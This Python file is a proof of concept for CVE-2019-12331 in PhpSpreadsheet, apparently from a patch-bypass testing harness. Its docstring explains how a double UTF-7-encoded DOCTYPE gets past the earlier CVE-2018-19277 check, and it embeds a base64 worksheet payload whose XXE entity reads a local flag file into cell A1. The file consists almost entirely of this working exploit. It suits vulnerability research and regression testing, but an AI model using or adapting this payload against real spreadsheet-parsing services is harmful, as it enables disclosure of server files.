#!/usr/bin/env python3
"""[RESIDUAL] CVE-2019-12331 residual PoC for xxe_phpspreadsheet_utf7（heldout 语义内嵌）。

The CVE-2018-19277 fix in V1 (1.5.1) decodes the declared charset to UTF-8 exactly ONCE before the
`<!DOCTYPE` scan. This residual DOUBLE-encodes the DOCTYPE/ENTITY body to UTF-7 (with a literal ASCII
`<?xml ... encoding="UTF-7"?>` declaration): V1 detects charset=UTF-7, mb_convert_encoding()s ONCE ->
the body is still UTF-7-encoded (one layer remains) so the literal `<!DOCTYPE` never appears -> the
scan passes -> V1 returns that once-decoded XML to libxml, which -- seeing encoding="UTF-7" -- decodes
the remaining layer at parse time, resolves the external entity, and reflects the flag into cell A1.
=> residual reaches the flag on V1. On V2 (1.8.0) the CVE-2019-12331 fix re-checks the encoding after
one decode -> "Suspicious Double-encoded XML" -> BLOCKED.
"""

# xl/worksheets/sheet1.xml: ascii `<?xml encoding="UTF-7"?>` + DOUBLE-UTF-7-encoded DOCTYPE/ENTITY body
SHEET_DOUBLE_UTF7_B64 = (
    "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTciPz4rQUNzLUFEd0FJUS1ET0NUWVBF"
    "IHggK0FDcy1BRnMgK0FDcy1BRHdBSVEtRU5USVRZIHh4ZSBTWVNURU0gK0FDcy1BQ0ktZmlsZTov"
    "Ly9jYW5hcnkvZmxhZy50eHQrQUNzLUFDSUFQZyArQUNzLUFGMEFQZ0E4LXdvcmtzaGVldCB4bWxu"
    "cytBQ3MtQUQwQUlnLWh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9zcHJlYWRzaGVl"
    "dG1sLzIwMDYvbWFpbitBQ3MtQUNJQVBnQTgtc2hlZXREYXRhK0FDcy1BRDRBUEEtcm93IHIrQUNz"
    "LUFEMEFJZy0xK0FDcy1BQ0lBUGdBOC1jIHIrQUNzLUFEMEFJZy1BMStBQ3MtQUNJIHQrQUNzLUFE"
    "MEFJZy1pbmxpbmVTdHIrQUNzLUFDSUFQZ0E4LWlzK0FDcy1BRDRBUEEtdCtBQ3MtQUQ0QUpnLXh4"
    "ZStBQ3MtQURzQVBBLS90K0FDcy1BRDRBUEEtL2lzK0FDcy1BRDRBUEEtL2MrQUNzLUFENEFQQS0v"
    "cm93K0FDcy1BRDRBUEEtL3NoZWV0RGF0YStBQ3MtQUQ0QVBBLS93b3Jrc2hlZXQrQUNzLUFENC0="
)


def candidate():
    return {"id": "residual_double_utf7", "sheet_b64": SHEET_DOUBLE_UTF7_B64}


if __name__ == "__main__":
    import json
    import sys
    _ = sys.argv  # 占位，保持与 original_poc.py 相同的调用签名
    print(json.dumps(candidate()))
